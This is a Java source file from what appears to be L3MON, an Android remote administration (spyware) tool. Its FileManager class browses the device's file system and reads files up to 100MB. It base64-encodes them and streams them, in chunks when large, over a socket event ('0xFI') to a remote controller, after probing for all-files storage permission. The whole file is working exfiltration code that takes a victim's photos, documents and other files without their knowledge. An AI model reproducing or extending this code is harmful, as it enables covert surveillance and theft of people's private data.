package com.etechd.l3mon.features.storage;

import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.util.Base64;
import android.util.Log;

import androidx.core.content.ContextCompat;

import com.etechd.l3mon.core.L3monApp;
import com.etechd.l3mon.core.network.SocketClient;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

public class FileManager {

    private static final String TAG = "FileManager";

    public JSONArray walk(String path) {
        JSONArray values = new JSONArray();
        if (path == null) return values;

        File dir = new File(path);
        if (!dir.exists() || !dir.canRead()) {
            Log.d(TAG, "inaccessible: " + path);
            sendError("Denied", path);
            return values;
        }

        File[] list = dir.listFiles();
        try {
            if (list != null) {
                JSONObject parentObj = new JSONObject();
                parentObj.put("name", "../");
                parentObj.put("isDir", true);
                parentObj.put("path", dir.getParent());
                values.put(parentObj);

                for (File file : list) {
                    if (!file.getName().startsWith(".")) {
                        JSONObject fileObj = new JSONObject();
                        fileObj.put("name", file.getName());
                        fileObj.put("isDir", file.isDirectory());
                        fileObj.put("path", file.getAbsolutePath());
                        values.put(fileObj);
                    }
                }
            }
        } catch (JSONException e) {
            Log.e(TAG, "walk JSON error", e);
        }

        return values;
    }

    public void downloadFile(String path) {
        if (path == null) return;

        Log.d(TAG, "downloadFile called with path: " + path);

        File file = new File(path);
        if (!file.exists()) {
            Log.e(TAG, "File does not exist: " + path);
            sendError("File does not exist", path);
            return;
        }

        if (!file.canRead()) {
            Log.e(TAG, "File not readable: " + path);
            sendError("File not readable", path);
            return;
        }

        Context context = L3monApp.getContext();

        // Check storage permissions based on Android version
        if (!hasStoragePermission(context, file)) {
            Log.e(TAG, "Storage permission denied for: " + path);
            sendError("Storage permission denied", path);
            return;
        }

        // Check file size to prevent memory issues
        long fileSize = file.length();
        Log.d(TAG, "File size: " + fileSize + " bytes");
        
        if (fileSize > 100 * 1024 * 1024) { // 100MB limit - very generous
            Log.e(TAG, "File too large: " + fileSize + " bytes (max 100MB)");
            sendError("File too large (max 100MB)", path);
            return;
        }

        if (fileSize == 0) {
            Log.e(TAG, "File is empty: " + path);
            sendError("File is empty", path);
            return;
        }

        Log.d(TAG, "Starting download of " + file.getName() + " (" + fileSize + " bytes)");

        // Check available memory before processing large files
        Runtime runtime = Runtime.getRuntime();
        long maxMemory = runtime.maxMemory();
        long usedMemory = runtime.totalMemory() - runtime.freeMemory();
        long availableMemory = maxMemory - usedMemory;
        
        Log.d(TAG, "Memory check - Available: " + (availableMemory / 1024 / 1024) + "MB, File: " + (fileSize / 1024 / 1024) + "MB");
        
        if (fileSize * 3 > availableMemory) { // Need 3x file size for processing (file + base64)
            Log.w(TAG, "Insufficient memory for file processing, attempting anyway with minimal footprint");
        }

        try {
            Log.d(TAG, "Reading file in chunks...");
            // Read file in chunks to avoid memory issues
            byte[] data = readFileInChunks(file);
            if (data == null) {
                Log.e(TAG, "Failed to read file data");
                sendError("Failed to read file data", path);
                return;
            }
            Log.d(TAG, "File read successfully, " + data.length + " bytes");

            // Encode to base64 with error handling
            String base64Data;
            try {
                Log.d(TAG, "Encoding to Base64...");
                base64Data = Base64.encodeToString(data, Base64.NO_WRAP);
                Log.d(TAG, "Base64 encoding completed, length: " + base64Data.length());
            } catch (OutOfMemoryError e) {
                Log.e(TAG, "Out of memory encoding file", e);
                sendError("File too large to encode", path);
                return;
            }

            Log.d(TAG, "Creating JSON object...");
            JSONObject object = new JSONObject();
            object.put("type", "download");
            object.put("name", file.getName());
            object.put("buffer", base64Data);
            object.put("path", path);
            Log.d(TAG, "JSON object created successfully");

            // Check if we should use chunked transfer for large files
            if (base64Data.length() > 200 * 1024) { // 200KB limit for single transfer - optimized
                Log.d(TAG, "File is large, using chunked transfer");
                sendFileInChunks(file.getName(), base64Data, path);
            } else {
                // Emit the data directly for small files
                try {
                    Log.d(TAG, "Attempting to emit file data via socket...");
                    SocketClient.getInstance().getSocket().emit("0xFI", object);
                    Log.d(TAG, "Successfully sent file: " + file.getName());
                } catch (Exception e) {
                    Log.e(TAG, "Failed to emit file data", e);
                    sendError("Failed to send file data", path);
                }
            }

        } catch (IOException e) {
            Log.e(TAG, "downloadFile IO error", e);
            sendError("Download failed: " + e.getMessage(), path);
        } catch (JSONException e) {
            Log.e(TAG, "downloadFile JSON error", e);
            sendError("JSON formatting error", path);
        } catch (OutOfMemoryError e) {
            Log.e(TAG, "downloadFile out of memory", e);
            sendError("File too large for memory", path);
        } catch (Exception e) {
            Log.e(TAG, "downloadFile unexpected error", e);
            sendError("Unexpected error: " + e.getMessage(), path);
        }
    }

    private byte[] readFileInChunks(File file) throws IOException {
        long fileSize = file.length();
        if (fileSize > Integer.MAX_VALUE) {
            throw new IOException("File too large");
        }

        byte[] data = new byte[(int) fileSize];
        int totalRead = 0;
        
        try (BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file), 8192)) {
            int bytesRead;
            while (totalRead < fileSize && (bytesRead = buf.read(data, totalRead, 
                    Math.min(8192, (int) fileSize - totalRead))) > 0) {
                totalRead += bytesRead;
            }
        }

        if (totalRead != fileSize) {
            Log.w(TAG, "File read incomplete: " + file.getAbsolutePath() + 
                  " (expected: " + fileSize + ", read: " + totalRead + ")");
            // Return partial data if we got some
            if (totalRead > 0) {
                byte[] partialData = new byte[totalRead];
                System.arraycopy(data, 0, partialData, 0, totalRead);
                return partialData;
            }
            return null;
        }

        return data;
    }

    /**
     * Check if the app has the necessary storage permissions to read the file
     */
    private boolean hasStoragePermission(Context context, File file) {
        try {
            // For Android 11+ (API 30+), check if we have MANAGE_EXTERNAL_STORAGE permission
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                // Check if we have the special "All files access" permission
                if (ContextCompat.checkSelfPermission(context, 
                        android.Manifest.permission.MANAGE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
                    return true;
                }
                
                // If not, check for legacy external storage permissions
                if (ContextCompat.checkSelfPermission(context, 
                        android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
                    return true;
                }
                
                // For Android 13+ (API 33+), check for media permissions if it's a media file
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    String fileName = file.getName().toLowerCase();
                    if (isImageFile(fileName) && 
                        ContextCompat.checkSelfPermission(context, 
                            android.Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED) {
                        return true;
                    }
                    if (isVideoFile(fileName) && 
                        ContextCompat.checkSelfPermission(context, 
                            android.Manifest.permission.READ_MEDIA_VIDEO) == PackageManager.PERMISSION_GRANTED) {
                        return true;
                    }
                    if (isAudioFile(fileName) && 
                        ContextCompat.checkSelfPermission(context, 
                            android.Manifest.permission.READ_MEDIA_AUDIO) == PackageManager.PERMISSION_GRANTED) {
                        return true;
                    }
                }
                
                // Try to access the file anyway - might be in app-specific directories
                return file.canRead();
            } else {
                // For Android 10 and below, check READ_EXTERNAL_STORAGE permission
                return ContextCompat.checkSelfPermission(context, 
                        android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
                        || file.canRead();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error checking storage permission", e);
            return file.canRead(); // Fallback to basic file access check
        }
    }

    private boolean isImageFile(String fileName) {
        return fileName.endsWith(".jpg") || fileName.endsWith(".jpeg") || 
               fileName.endsWith(".png") || fileName.endsWith(".gif") || 
               fileName.endsWith(".webp") || fileName.endsWith(".bmp");
    }

    private boolean isVideoFile(String fileName) {
        return fileName.endsWith(".mp4") || fileName.endsWith(".avi") || 
               fileName.endsWith(".mkv") || fileName.endsWith(".mov") || 
               fileName.endsWith(".wmv") || fileName.endsWith(".3gp");
    }

    private boolean isAudioFile(String fileName) {
        return fileName.endsWith(".mp3") || fileName.endsWith(".wav") || 
               fileName.endsWith(".ogg") || fileName.endsWith(".m4a") || 
               fileName.endsWith(".aac") || fileName.endsWith(".flac");
    }

    private void sendFileInChunks(String fileName, String base64Data, String path) {
        try {
            final int CHUNK_SIZE = 100 * 1024; // 100KB chunks for better performance
            final int totalChunks = (int) Math.ceil((double) base64Data.length() / CHUNK_SIZE);
            final String transferId = generateTransferId();
            
            Log.d(TAG, "Sending file in " + totalChunks + " chunks, transferId: " + transferId);
            
            // Send start chunk
            JSONObject startChunk = new JSONObject();
            startChunk.put("type", "download_start");
            startChunk.put("transferId", transferId);
            startChunk.put("name", fileName);
            startChunk.put("path", path);
            startChunk.put("totalChunks", totalChunks);
            startChunk.put("totalSize", base64Data.length());
            
            SocketClient.getInstance().getSocket().emit("0xFI", startChunk);
            Log.d(TAG, "Sent start chunk");
            
            // Send data chunks with delay between each
            for (int i = 0; i < totalChunks; i++) {
                final int chunkIndex = i;
                final int start = i * CHUNK_SIZE;
                final int end = Math.min(start + CHUNK_SIZE, base64Data.length());
                final String chunkData = base64Data.substring(start, end);
                
                // Send chunk after a small delay
                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                    try {
                        JSONObject dataChunk = new JSONObject();
                        dataChunk.put("type", "download_chunk");
                        dataChunk.put("transferId", transferId);
                        dataChunk.put("chunkIndex", chunkIndex);
                        dataChunk.put("chunkData", chunkData);
                        
                        SocketClient.getInstance().getSocket().emit("0xFI", dataChunk);
                        
                        int progress = (int) ((chunkIndex + 1) * 100.0 / totalChunks);
                        Log.d(TAG, "Sent chunk " + (chunkIndex + 1) + "/" + totalChunks + " (" + progress + "%)");
                        
                        // Send end chunk after last data chunk
                        if (chunkIndex == totalChunks - 1) {
                            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                                try {
                                    JSONObject endChunk = new JSONObject();
                                    endChunk.put("type", "download_end");
                                    endChunk.put("transferId", transferId);
                                    
                                    SocketClient.getInstance().getSocket().emit("0xFI", endChunk);
                                    Log.d(TAG, "Sent end chunk, transfer complete");
                                } catch (Exception e) {
                                    Log.e(TAG, "Error sending end chunk", e);
                                }
                            }, 50);
                        }
                        
                    } catch (Exception e) {
                        Log.e(TAG, "Error sending chunk " + chunkIndex, e);
                    }
                }, i * 50); // 50ms delay between chunks for faster transfer
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error in chunked transfer", e);
            sendError("Chunked transfer failed", path);
        }
    }
    
    private String generateTransferId() {
        return "transfer_" + System.currentTimeMillis() + "_" + (int)(Math.random() * 1000);
    }

    private void sendError(String message, String path) {
        try {
            JSONObject errorJson = new JSONObject();
            errorJson.put("type", "error");
            errorJson.put("error", message);
            if (path != null) {
                errorJson.put("path", path);
            }
            SocketClient.getInstance().getSocket().emit("0xFI", errorJson);
        } catch (JSONException e) {
            Log.e(TAG, "sendError JSON exception", e);
        }
    }
}
